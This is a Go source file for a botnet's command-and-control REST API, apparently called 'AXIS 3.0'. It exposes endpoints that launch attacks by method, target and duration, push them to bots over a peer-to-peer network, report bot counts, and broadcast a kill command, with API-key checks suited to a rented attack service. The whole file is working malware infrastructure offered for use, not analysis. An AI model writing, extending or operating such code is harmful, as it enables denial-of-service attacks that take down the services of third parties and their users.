package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"time"
)

/*
 * AXIS 3.0 REST API
 * Endpoints:
 *   POST /api/attack - Launch attack
 *   GET  /api/status   - Get network status
 *   GET  /api/bots     - Get bot count (P2P peers)
 *   POST /api/kill     - Stop all attacks
 */

type APIRequest struct {
	Method   string `json:"method"`
	Target   string `json:"target"`
	Duration int    `json:"duration"`
	APIKey   string `json:"api_key"`
}

type APIResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Data    interface{} `json:"data,omitempty"`
}

type APIServer struct {
	listenAddr string
}

func NewAPIServer(addr string) *APIServer {
	return &APIServer{listenAddr: addr}
}

func (this *APIServer) Start() {
	http.HandleFunc("/api/attack", this.handleAttack)
	http.HandleFunc("/api/status", this.handleStatus)
	http.HandleFunc("/api/bots", this.handleBots)
	http.HandleFunc("/api/kill", this.handleKill)

	fmt.Printf("API Server listening on %s\n", this.listenAddr)
	http.ListenAndServe(this.listenAddr, nil)
}

func (this *APIServer) handleAttack(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Method not allowed"})
		return
	}

	var req APIRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid JSON"})
		return
	}

	/* Validate API key */
	if !database.ValidateAPIKey(req.APIKey) {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid API key"})
		return
	}

	/* Validate method */
	attackInfo, ok := attackInfoLookup[req.Method]
	if !ok {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid attack method"})
		return
	}

	/* Build attack */
	atk, err := NewAttack(fmt.Sprintf("%s %s %d", req.Method, req.Target, req.Duration), true)
	if err != nil {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
		return
	}

	buf, err := atk.Build()
	if err != nil {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
		return
	}

	/* Send via P2P network */
	p2pSeeds := getAutoP2PSeeds()
	injector := NewP2PInjector(p2pSeeds)
	if err := injector.SendAttack(buf); err != nil {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
		return
	}

	json.NewEncoder(w).Encode(APIResponse{
		Success: true,
		Message: "Attack launched successfully",
		Data: map[string]interface{}{
			"method":   req.Method,
			"target":   req.Target,
			"duration": req.Duration,
		},
	})
}

func (this *APIServer) handleStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	status := map[string]interface{}{
		"status":      "online",
		"network":     "P2P",
		"uptime":      time.Now().Format(time.RFC3339),
		"version":     "2.0",
		"attack_types": len(attackInfoLookup),
	}

	json.NewEncoder(w).Encode(APIResponse{Success: true, Message: "OK", Data: status})
}

func (this *APIServer) handleBots(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	/* P2P network - estimate bot count from peer count */
	botCount := estimateP2PPeers()

	json.NewEncoder(w).Encode(APIResponse{
		Success: true,
		Message: "OK",
		Data: map[string]int{
			"bots": botCount,
		},
	})
}

func (this *APIServer) handleKill(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "POST" {
		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Method not allowed"})
		return
	}

	/* Build kill packet */
	killPacket := []byte{0x11, 0x00}  /* P2P_CMD_KILL, TTL=0 */

	p2pSeeds := getAutoP2PSeeds()
	injector := NewP2PInjector(p2pSeeds)
	injector.SendAttack(killPacket)

	json.NewEncoder(w).Encode(APIResponse{
		Success: true,
		Message: "Kill command sent to P2P network",
	})
}

/* Helper functions */

func getAutoP2PSeeds() string {
	/* Auto-discover P2P seeds from recent connections */
	seeds := []string{}
	
	/* Try common local network broadcasts */
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					ip := ipnet.IP.To4()
					seed := fmt.Sprintf("%d.%d.%d.%d:49152", ip[0], ip[1], ip[2], ip[3])
					seeds = append(seeds, seed)
				}
			}
		}
	}

	/* Add configured seeds if any */
	configured := "127.0.0.1:49152"
	if configured != "" {
		seeds = append(seeds, strings.Split(configured, ",")...)
	}

	result := ""
	for i, seed := range seeds {
		if i > 0 {
			result += ","
		}
		result += seed
	}

	return result
}

func estimateP2PPeers() int {
	/* Estimate from recent P2P activity */
	/* In production, this would track actual peer count */
	return 0  /* P2P - exact count not available */
}
